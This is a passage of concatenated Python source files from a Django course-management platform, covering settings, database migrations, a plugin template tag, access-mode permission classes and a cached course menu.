True\nUSE_L10N = True\nUSE_TZ = True\nFORMAT_MODULE_PATH = 'aplus'\nLOCALE_PATHS = (\n    join(BASE_DIR, 'locale'),\n)\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/1.7/howto/static-files/\nSTATICFILES_STORAGE = 'lib.storage.BumpStaticFilesStorage'\nSTATICFILES_DIRS = (\n    join(BASE_DIR, 'assets'),\n)\nSTATIC_URL = '/static/'\nSTATIC_ROOT = join(BASE_DIR, 'static')\n\nMEDIA_URL = '/media/'\nMEDIA_ROOT = join(BASE_DIR, 'media')\n\n# Django REST Framework settings\n# http://www.django-rest-framework.org/api-guide/settings/\nREST_FRAMEWORK = {\n    'DEFAULT_AUTHENTICATION_CLASSES': (\n        # Clients should use token for authentication\n        # Requires rest_framework.authtoken in apps.\n        'rest_framework.authentication.TokenAuthentication',\n        'lib.api.authentication.grader.GraderAuthentication',\n        'rest_framework.authentication.SessionAuthentication',\n    ),\n    'DEFAULT_PERMISSION_CLASSES': (\n        # If not other permissions are defined, require login.\n        'rest_framework.permissions.IsAuthenticated',\n        'userprofile.permissions.GraderUserCanOnlyRead',\n    ),\n    'DEFAULT_RENDERER_CLASSES': (\n        'lib.api.core.APlusJSONRenderer',\n        'rest_framework.renderers.BrowsableAPIRenderer',\n    ),\n    'DEFAULT_CONTENT_NEGOTIATION_CLASS': 'lib.api.core.APlusContentNegotiation',\n    'DEFAULT_VERSIONING_CLASS': 'lib.api.core.APlusVersioning',\n    'PAGE_SIZE': 100,\n    'DEFAULT_VERSION': '2',\n    'ALLOWED_VERSIONS': {\n        # These are really just latest versions\n        '1': '1.0',\n        '2': '2.0',\n    },\n}\n\n\n# Test environment url fixes are implemented using these. Typically not required for production\nOVERRIDE_SUBMISSION_HOST = None\nREMOTE_PAGE_HOSTS_MAP = None\n\n# Maximum submissions limit for exercises that allow unofficial submissions.\n# The exercise-specific max submissions limit may then be exceeded, however,\n# this limit will prevent students from spamming massive amounts of submissions.\n# Set this value to zero in order to remove the limit.\nMAX_UNOFFICIAL_SUBMISSIONS = 200\n\n# Testing\n# https://docs.djangoproject.com/en/1.7/topics/testing/advanced/\nTEST_RUNNER = \"xmlrunner.extra.djangotestrunner.XMLTestRunner\"\nTEST_OUTPUT_VERBOSE = True\nTEST_OUTPUT_DESCRIPTIONS = True\nTEST_OUTPUT_DIR = \"test_results\"\n\n# Logging\n# https://docs.djangoproject.com/en/1.7/topics/logging/\nfrom lib.logging import skip_unreadable_post\nLOGGING = {\n  'version': 1,\n  'disable_existing_loggers': False,\n  'formatters': {\n    'verbose': {\n      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s'\n    },\n    'colored': {\n      '()': 'r_django_essentials.logging.SourceColorizeFormatter',\n      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s',\n      'colors': {\n        'django.db.backends': {'fg': 'cyan'},\n        'django.db.deferred': {'fg': 'yellow'},\n        'cached': {'fg': 'red'},\n      },\n    },\n  },\n  'filters': {\n    'skip_unreadable_post': {\n        '()': 'django.utils.log.CallbackFilter',\n        'callback': skip_unreadable_post,\n    },\n    'require_debug_true': {\n      '()': 'django.utils.log.RequireDebugTrue',\n    },\n    'require_debug_false': {\n      '()': 'django.utils.log.RequireDebugFalse',\n    },\n  },\n  'handlers': {\n    'debug_console': {\n      'level': 'DEBUG',\n      'filters': ['require_debug_true'],\n      'class': 'logging.StreamHandler',\n      'stream': 'ext://sys.stdout',\n      'formatter': 'colored',\n    },\n    'console': {\n      'level': 'DEBUG',\n      'class': 'logging.StreamHandler',\n      'stream': 'ext://sys.stdout',\n      'formatter': 'verbose',\n    },\n    'email': {\n      'level': 'ERROR',\n      'filters': ['require_debug_false', 'skip_unreadable_post'],\n      'class': 'django.utils.log.AdminEmailHandler',\n    },\n    'mail_admins': {\n      # Duplicate of above, so if django internally refers it, we will use our filters\n      'level': 'ERROR',\n      'filters': ['require_debug_false', 'skip_unreadable_post'],\n      'class': 'django.utils.log.AdminEmailHandler',\n    },\n  },\n  'loggers': {\n    '': {\n      'level': 'INFO',\n      'handlers': ['console', 'email'],\n      'propagate': True\n    },\n    # Django defines these loggers internally, so we need to reconfigure them.\n    'django': {\n      'level': 'INFO',\n      'handlers': ['console', 'email'],\n    },\n    'py.warnings': {\n      'handlers': ['console'],\n    },\n  },\n}\n\n\n\n\n\n###############################################################################\n#\n# Logic to load settings from other files and tune them based on DEBUG\n#\nfrom os import environ\nfrom r_django_essentials.conf import *\n\n# Load settings from: local_settings, secret_key and environment\nupdate_settings_with_file(__name__,\n                          environ.get('APLUS_LOCAL_SETTINGS', 'local_settings'),\n                          quiet='APLUS_LOCAL_SETTINGS' in environ)\nupdate_settings_from_environment(__name__, 'DJANGO_') # FIXME: deprecated. was used with containers before, so keep it here for now.\nupdate_settings_from_environment(__name__, 'APLUS_')\nupdate_secret_from_file(__name__, environ.get('APLUS_SECRET_KEY_FILE', 'secret_key'))\n\n# Complain if BASE_URL is not set\ntry:\n    if not BASE_URL:\n        raise RuntimeError('Local setting BASE_URL should be non-empty')\nexcept NameError as e:\n    raise RuntimeError('BASE_URL must be specified in local settings') from e\n\n# update INSTALLED_APPS\nif 'INSTALLED_LOGIN_APPS' in globals():\n    INSTALLED_APPS = INSTALLED_LOGIN_APPS + INSTALLED_APPS\n\n# update template loaders for production\nuse_cache_template_loader_in_production(__name__)\n\n# setup authentication backends based on installed_apps\nSOCIAL_AUTH = False\nAUTHENTICATION_BACKENDS = (\n    'django.contrib.auth.backends.ModelBackend',\n)\nif 'shibboleth_login' in INSTALLED_APPS:\n    AUTHENTICATION_BACKENDS += ('shibboleth_login.auth_backend.ShibbolethAuthBackend',)\nif 'social_django' in INSTALLED_APPS:\n    SOCIAL_AUTH = True\n    AUTHENTICATION_BACKENDS += ('social_core.backends.google.GoogleOAuth2',)\n\n\n\nif DEBUG:\n    # Allow basic auth for API when DEBUG is on\n    REST_FRAMEWORK['DEFAULT_AUTHENTICATION_CLASSES'] += ('rest_framework.authentication.BasicAuthentication',)\n    # Enable defer logging\n    from lib.models import install_defer_logger\n    install_defer_logger()\n/n/n/n/apps/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('contenttypes', '0001_initial'),\n        ('inheritance', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='BasePlugin',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),\n                ('container_pk', models.TextField(verbose_name='object ID')),\n                ('title', models.CharField(max_length=64)),\n                ('views', models.CharField(blank=True, max_length=255)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='BaseTab',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),\n                ('container_pk', models.TextField(verbose_name='object ID')),\n                ('label', models.CharField(max_length=12)),\n                ('title', models.CharField(max_length=64)),\n                ('order', models.IntegerField(default=100)),\n                ('opening_method', models.CharField(blank=True, max_length=32)),\n            ],\n            options={\n                'ordering': ['order', 'id'],\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='EmbeddedTab',\n            fields=[\n                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),\n                ('content_url', models.URLField(max_length=128)),\n                ('element_id', models.CharField(blank=True, max_length=32)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.basetab',),\n        ),\n        migrations.CreateModel(\n            name='ExternalIFramePlugin',\n            fields=[\n                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),\n                ('service_url', models.URLField(max_length=255)),\n                ('width', models.IntegerField()),\n                ('height', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.baseplugin',),\n        ),\n        migrations.CreateModel(\n            name='ExternalIFrameTab',\n            fields=[\n                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),\n                ('content_url', models.URLField(max_length=255)),\n                ('width', models.IntegerField()),\n                ('height', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.basetab',),\n        ),\n        migrations.CreateModel(\n            name='HTMLPlugin',\n            fields=[\n                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),\n                ('content', models.TextField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.baseplugin',),\n        ),\n        migrations.CreateModel(\n            name='HTMLTab',\n            fields=[\n                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),\n                ('content', models.TextField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.basetab',),\n        ),\n        migrations.CreateModel(\n            name='RSSPlugin',\n            fields=[\n                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),\n                ('feed_url', models.URLField(max_length=256)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.baseplugin',),\n        ),\n        migrations.AddField(\n            model_name='basetab',\n            name='container_type',\n            field=models.ForeignKey(to='contenttypes.ContentType'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='baseplugin',\n            name='container_type',\n            field=models.ForeignKey(to='contenttypes.ContentType'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/apps/templatetags/apps.py/n/nimport logging\n\nfrom django import template\n\nfrom apps.app_renderers import build_plugin_renderers\nfrom course.models import CourseInstance\nfrom exercise.exercise_models import BaseExercise\nfrom exercise.submission_models import Submission\n\n\nlogger = logging.getLogger(\"aplus.apps\")\nregister = template.Library()\n\n\n@register.assignment_tag\ndef plugin_renderers(user, some_model, view_name=None):\n    \"\"\"\n    Builds the plugin renderers for a view.\n    \"\"\"\n    profile = user.userprofile if user.is_authenticated() else None\n    if isinstance(some_model, CourseInstance):\n        return build_plugin_renderers(\n            some_model.plugins.all(),\n            view_name or \"course_instance\",\n            user_profile=profile,\n            course_instance=some_model,\n        )\n    if isinstance(some_model, BaseExercise):\n        course_instance = some_model.course_instance\n        return build_plugin_renderers(\n            course_instance.plugins.all(),\n            view_name or \"exercise\",\n            user_profile=profile,\n            exercise=some_model,\n            course_instance=course_instance,\n        )\n    if isinstance(some_model, Submission):\n        course_instance = some_model.exercise.course_instance\n        return build_plugin_renderers(\n            course_instance.plugins.all(),\n            view_name or \"submission\",\n            user_profile=profile,\n            submission=some_model,\n            exercise=some_model.exercise,\n            course_instance=course_instance,\n        )\n    logger.warn(\"Unrecognized model type received for plugin_renderers tag: {}\" \\\n                .format(str(type(some_model))))\n    return []\n/n/n/n/authorization/permissions.py/n/nfrom django.utils.translation import string_concat, ugettext_lazy as _\n\ntry:\n    from django.utils.text import format_lazy\nexcept ImportError: # implemented in Django 1.11\n    from django.utils.functional import lazy as _lazy\n    def _format_lazy(format_string, *args, **kwargs):\n        return format_string.format(*args, **kwargs)\n    format_lazy = _lazy(_format_lazy, str)\n\nfrom lib.helpers import Enum\n\n\"\"\"\nBase permission classes.\n\nThese classes use same interface than ones in django-rest-framework and\nare usable with APIViews too. We define our superclass so we don't need to\ndepend on django-rest-framework.\n\"\"\"\n\n\nSAFE_METHODS = ('GET', 'HEAD', 'OPTIONS')\n\n\nclass FilterBackend(object):\n    \"\"\"\n    FilterBackend interface\n    \"\"\"\n    def filter_queryset(self, request, queryset, view):\n        \"\"\"\n        Return a filtered queryset.\n        \"\"\"\n        raise NotImplementedError\n\n    def get_fields(self, view):\n        return []\n\n\nclass Permission(object):\n    \"\"\"\n    Permission interface\n    \"\"\"\n    def has_permission(self, request, view):\n        \"\"\"\n        Return `True` if permission is granted, `False` otherwise.\n        \"\"\"\n        return True\n\n    def has_object_permission(self, request, view, obj):\n        \"\"\"\n        Return `True` if permission is granted, `False` otherwise.\n        \"\"\"\n        return True\n\n\nclass NoPermission(Permission):\n    \"\"\"\n    Base Permission class that gives no access permission to anyone.\n    \"\"\"\n    def has_permission(self, request, view):\n        return False\n\n    def has_object_permission(self, request, view, obj):\n        return False\n\n\nclass MessageMixin(object):\n    \"\"\"\n    Adds easy way to specify what exactly caused the PermissionDenied\n    \"\"\"\n    def error_msg(self, message: str, delim=None, format=None, replace=False):\n        \"\"\"\n        Add extra text to self.message about the reason why permission\n        was denied. Uses lazy object so the message string is evaluated\n        only when rendered.\n\n        If optional argument `format` is given, then it's used with format_lazy\n        to format the message with the dictionary arguments from `format` arg.\n\n        Optional argument `delim` can be used to change the string used to join\n        self.message and `message`.\n\n        If optional argument `replace` is true, then self.message is replaced with\n        the `message`.\n        \"\"\"\n        if delim is None:\n            delim = ': '\n\n        if format:\n            message = format_lazy(message, **format)\n\n        if replace:\n            self.message = message\n        else:\n            assert 'message' not in self.__dict__, (\n                \"You are calling error_msg without replace=True \"\n                \"after calling it with it firts. Fix your code by removing \"\n                \"firts method call add replace=True to second method call too.\"\n            )\n            self.message = string_concat(self.message, delim, message)\n\n\n# Access mode\n# ===========\n\n# All access levels\nACCESS = Enum(\n    ('ANONYMOUS', 0, _(\"Any user authenticated or not\")),\n    ('ENROLL', 1, None),\n    ('STUDENT', 3, _(\"Any authenticated student\")),\n    ('ENROLLED', 4, _(\"Enrolled student of the course\")),\n    ('ASSISTANT', 5, _(\"Assistant of the course\")),\n    ('GRADING', 6, _(\"Grading. Assistant if course has that option or teacher\")),\n    ('TEACHER', 10, _(\"Teacher of the course\")),\n    ('SUPERUSER', 100, _(\"Superuser of the service\")),\n)\n\n\nclass AccessModePermission(MessageMixin, Permission):\n    \"\"\"\n    If view has access_mode that is not anonymous, then require authentication\n    \"\"\"\n    message = _(\"Permission denied by access mode.\")\n\n    def has_permission(self, request, view):\n        access_mode = view.get_access_mode()\n\n        if access_mode == ACCESS.ANONYMOUS:\n            return True\n        if not request.user.is_authenticated():\n            return False\n\n        if access_mode >= ACCESS.SUPERUSER:\n            return request.user.is_superuser\n\n        if access_mode >= ACCESS.TEACHER:\n            if not view.is_teacher:\n                self.error_msg(_(\"Only course teachers shall pass.\"))\n                return False\n\n        elif access_mode >= ACCESS.ASSISTANT:\n            if not view.is_course_staff:\n                self.error_msg(_(\"Only course staff shall pass.\"))\n                return False\n\n        elif access_mode == ACCESS.ENROLLED:\n            if not view.is_course_staff and not view.is_student:\n                self.error_msg(_(\"Only enrolled students shall pass.\"))\n                return False\n\n        return True\n\n\n# Object permissions\n# ==================\n\n\nclass ObjectVisibleBasePermission(MessageMixin, Permission):\n    model = None\n    obj_var = None\n\n    def has_permission(self, request, view):\n        obj = getattr(view, self.obj_var, None)\n        return (\n            obj is None or\n            self.has_object_permission(request, view, obj)\n        )\n\n    def has_object_permission(self, request, view, obj):\n        user = request.user\n        return (\n            not isinstance(obj, self.model) or # skip objects that are not model in question\n            user.is_staff or\n            user.is_superuser or\n            self.is_object_visible(request, view, obj)\n        )\n\n    def is_object_visible(self, request, view, obj):\n        raise NotImplementedError\n/n/n/n/course/cache/menu.py/n/nfrom django.db.models.signals import post_save, post_delete, m2m_changed\nfrom django.utils import timezone\n\nfrom lib.cache import CachedAbstract\nfrom ..models import StudentGroup, Enrollment, CourseInstance, Course\nfrom ..renders import render_group_info\n\n\nclass CachedTopMenu(CachedAbstract):\n    KEY_PREFIX = 'topmenu'\n\n    def __init__(self, user):\n        self.user = user\n        super().__init__(user)\n\n    def _generate_data(self, user, data=None):\n        profile = user.userprofile if user and user.is_authenticated() else None\n        return {\n            'courses': self._generate_courses(profile),\n            'groups': self._generate_groups(profile),\n        }\n\n    def _generate_courses(self, profile):\n        if not profile:\n            return []\n\n        def course_entry(instance):\n            return {\n                'name': str(instance),\n                'link': instance.get_absolute_url(),\n            }\n        def divider_entry():\n            return {\n                'divider': True,\n            }\n\n        enrolled = []\n        for instance in profile.enrolled.all():\n            enrolled.append(course_entry(instance))\n\n        teaching = []\n        for course in profile.teaching_courses.all():\n            for instance in course.instances.all():\n                teaching.append(course_entry(instance))\n\n        assisting = []\n        for instance in profile.assisting_courses.all():\n            assisting.append(course_entry(instance))\n\n        courses = []\n        courses.extend(enrolled)\n        if courses and teaching:\n            courses.append(divider_entry())\n        courses.extend(teaching)\n        if courses and assisting:\n            courses.append(divider_entry())\n        courses.extend(assisting)\n        return courses\n\n    def _generate_groups(self, profile):\n        if not profile:\n            return {}\n\n        def group_entry(group):\n            return {\n                'id': group.id,\n                'size': group.members.count(),\n                'collaborators': group.collaborator_names(profile),\n            }\n\n        group_map = {}\n        for enrollment in Enrollment.objects\\\n                .filter(user_profile=profile)\\\n                .select_related('selected_group')\\\n                .prefetch_related('selected_group__members'):\n            instance_id = enrollment.course_instance_id\n            group_map[instance_id] = (\n                [\n                    group_entry(g) for g in profile.groups\\\n                        .filter(course_instance_id=instance_id)\\\n                        .prefetch_related('members')\n                ],\n                render_group_info(enrollment.selected_group, profile)\n            )\n        return group_map\n\n    def courses(self):\n        return self.data['courses']\n\n    def groups(self, instance):\n        return self.data['groups'].get(instance.id, ([],None))\n\n\ndef invalidate_content(sender, instance, **kwargs):\n    CachedTopMenu.invalidate(instance.user_profile.user)\n\ndef invalidate_assistants(sender, instance, reverse=False, **kwargs):\n    if reverse:\n        CachedTopMenu.invalidate(instance.user)\n    else:\n        for profile in instance.assistants.all():\n            CachedTopMenu.invalidate(profile.user)\n\ndef invalidate_teachers(sender, instance, reverse=False, **kwargs):\n    if reverse:\n        CachedTopMenu.invalidate(instance.user)\n    else:\n        for profile in instance.teachers.all():\n            CachedTopMenu.invalidate(profile.user)\n\ndef invalidate_members(sender, instance, reverse=False, **kwargs):\n    if reverse:\n        CachedTopMenu.invalidate(instance.user)\n    else:\n        for profile in instance.members.all():\n            CachedTopMenu.invalidate(profile.user)\n\n\n# Automatically invalidate cached menu when enrolled or edited.\npost_save.connect(invalidate_content, sender=Enrollment)\npost_delete.connect(invalidate_content, sender=Enrollment)\nm2m_changed.connect(invalidate_assistants, sender=CourseInstance.assistants.through)\nm2m_changed.connect(invalidate_teachers, sender=Course.teachers.through)\nm2m_changed.connect(invalidate_members, sender=StudentGroup.members.through)\n/n/n/n/course/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Course',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(max_length=255)),\n                ('code', models.CharField(max_length=255)),\n                ('url', models.CharField(help_text=b\"Input an identifier for this course's URL.\", unique=True, max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\\\w\\\\-\\\\.]*$')])),\n                ('teachers', models.ManyToManyField(related_name='teaching_courses', to='userprofile.UserProfile', blank=True)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='CourseHook',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('hook_url', models.URLField()),\n                ('hook_type', models.CharField(default=b'post-grading', max_length=12, choices=[(b'post-grading', b'Post grading')])),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='CourseInstance',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('instance_name', models.CharField(max_length=255)),\n                ('website', models.URLField(max_length=255, blank=True)),\n                ('url', models.CharField(help_text=b'Input an URL identifier for this course.', max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\\\w\\\\-\\\\.]*$')])),\n                ('starting_time', models.DateTimeField()),\n                ('ending_time', models.DateTimeField()),\n                ('visible_to_students', models.BooleanField(default=True)),\n                ('assistants', models.ManyToManyField(related_name='assisting_courses', to='userprofile.UserProfile', blank=True)),\n                ('course', models.ForeignKey(related_name='instances', to='course.Course')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='courseinstance',\n            unique_together=set([('course', 'url')]),\n        ),\n        migrations.AddField(\n            model_name='coursehook',\n            name='course_instance',\n            field=models.ForeignKey(related_name='course_hooks', to='course.CourseInstance'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/course/migrations/0005_auto_20150625_1835.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.utils.timezone\nimport lib.fields\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0006_auto_20150625_1823'),\n        ('userprofile', '0002_auto_20150427_1717'),\n        ('inheritance', '0001_initial'),\n        ('course', '0004_auto_20150625_1821'),\n    ]\n\n    state_operations = [\n        migrations.CreateModel(\n            name='CourseModule',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('name', models.CharField(max_length=255)),\n                ('url', models.CharField(max_length=255, validators=[django.core.validators.RegexValidator(regex='^(?!teachers$)(?!user$)[\\\\w\\\\-\\\\.]*$')], help_text='Input an URL identifier for this module. Taken words include: teachers, user')),\n                ('chapter', models.IntegerField(default=1)),\n                ('subchapter', models.IntegerField(default=1)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('introduction', models.TextField(blank=True)),\n                ('opening_time', models.DateTimeField(default=django.utils.timezone.now)),\n                ('closing_time', models.DateTimeField(default=django.utils.timezone.now)),\n                ('content_url', models.URLField(blank=True)),\n                ('late_submissions_allowed', models.BooleanField(default=False)),\n                ('late_submission_deadline', models.DateTimeField(default=django.utils.timezone.now)),\n                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),\n                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance')),\n            ],\n            options={\n                'ordering': ['closing_time', 'id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='LearningObjectCategory',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('name', models.CharField(max_length=35)),\n                ('description', models.TextField(blank=True)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance')),\n                ('hidden_to', models.ManyToManyField(blank=True, related_name='hidden_categories', null=True, to='userprofile.UserProfile')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='learningobjectcategory',\n            unique_together=set([('name', 'course_instance')]),\n        ),\n        migrations.AlterUniqueTogether(\n            name='coursemodule',\n            unique_together=set([('course_instance', 'url')]),\n        ),\n    ]\n\n    operations = [\n        migrations.SeparateDatabaseAndState(state_operations=state_operations)\n    ]\n/n/n/n/course/migrations/0006_auto_20150721_1152.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0005_auto_20150625_1835'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseChapter',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, verbose_name='ID', serialize=False)),\n                ('order', models.IntegerField(default=1)),\n                ('name', models.CharField(max_length=255)),\n                ('url', models.CharField(help_text='Input an URL identifier for this chapter.', validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')], max_length=255)),\n                ('content_url', models.URLField(help_text='The resource to show.')),\n                ('course_module', models.ForeignKey(related_name='chapters', to='course.CourseModule')),\n            ],\n            options={\n                'ordering': ['course_module', 'order', 'id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='coursechapter',\n            unique_together=set([('course_module', 'url')]),\n        ),\n        migrations.AlterModelOptions(\n            name='coursemodule',\n            options={'ordering': ['closing_time', 'order', 'id']},\n        ),\n        migrations.RenameField(\n            model_name='coursemodule',\n            old_name='chapter',\n            new_name='order',\n        ),\n        migrations.RemoveField(\n            model_name='coursemodule',\n            name='content_url',\n        ),\n        migrations.RemoveField(\n            model_name='coursemodule',\n            name='subchapter',\n        ),\n        migrations.AlterField(\n            model_name='course',\n            name='url',\n            field=models.CharField(unique=True, validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')], max_length=255, help_text='Input an URL identifier for this course.'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='url',\n            field=models.CharField(help_text='Input an URL identifier for this module.', validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')], max_length=255),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/course/migrations/0011_auto_20151215_1133.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0010_auto_20151214_1714'),\n    ]\n\n    operations = [\n        migrations.AddField(\n            model_name='coursechapter',\n            name='parent',\n            field=models.ForeignKey(to='course.CourseChapter', blank=True, null=True, related_name='children'),\n            preserve_default=True,\n        ),\n        migrations.AlterUniqueTogether(\n            name='coursechapter',\n            unique_together=set([]),\n        ),\n    ]\n/n/n/n/course/migrations/0021_auto_20160726_1209.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0002_auto_20150427_1717'),\n        ('course', '0020_auto_20160615_1239'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Enrollment',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('personal_code', models.CharField(max_length=10, blank=True, default='')),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance')),\n                ('user_profile', models.ForeignKey(to='userprofile.UserProfile')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='courseinstance',\n            name='students2',\n            field=models.ManyToManyField(to='userprofile.UserProfile', through='course.Enrollment', related_name='enrolled', blank=True),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/course/migrations/0025_auto_20160728_1139.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0003_auto_20160728_1139'),\n        ('course', '0024_auto_20160726_1232'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='StudentGroup',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('course_instance', models.ForeignKey(related_name='groups', to='course.CourseInstance')),\n                ('members', models.ManyToManyField(to='userprofile.UserProfile', related_name='groups')),\n            ],\n            options={\n                'ordering': ['course_instance', 'timestamp'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='enrollment',\n            name='selected_group',\n            field=models.ForeignKey(null=True, on_delete=django.db.models.deletion.SET_NULL, default=None, blank=True, to='course.StudentGroup'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/course/migrations/0029_usertags.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport lib.models\nimport colorfield.fields\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0003_auto_20160728_1139'),\n        ('course', '0028_auto_20160825_0601'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='UserTag',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('name', models.CharField(max_length=200)),\n                ('description', models.CharField(blank=True, max_length=164, help_text='Describe the usage or meaning of this usertag')),\n                ('visible_to_students', models.BooleanField(default=False)),\n                ('color', colorfield.fields.ColorField(default='#CD0000', help_text='Color that is used for this tag.', max_length=10)),\n                ('course_instance', models.ForeignKey(related_name='usertags', to='course.CourseInstance')),\n            ],\n            options={\n            },\n            bases=(lib.models.UrlMixin, models.Model),\n        ),\n        migrations.CreateModel(\n            name='UserTagging',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('course_instance', models.ForeignKey(related_name='taggings', to='course.CourseInstance')),\n                ('tag', models.ForeignKey(related_name='taggings', to='course.UserTag')),\n                ('user', models.ForeignKey(related_name='taggings', to='userprofile.UserProfile')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='usertagging',\n            unique_together=set([('tag', 'user', 'course_instance')]),\n        ),\n        migrations.AlterIndexTogether(\n            name='usertagging',\n            index_together=set([('user', 'course_instance')]),\n        ),\n    ]\n/n/n/n/course/permissions.py/n/nfrom django.http import Http404\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom authorization.permissions import (\n    ACCESS,\n    Permission,\n    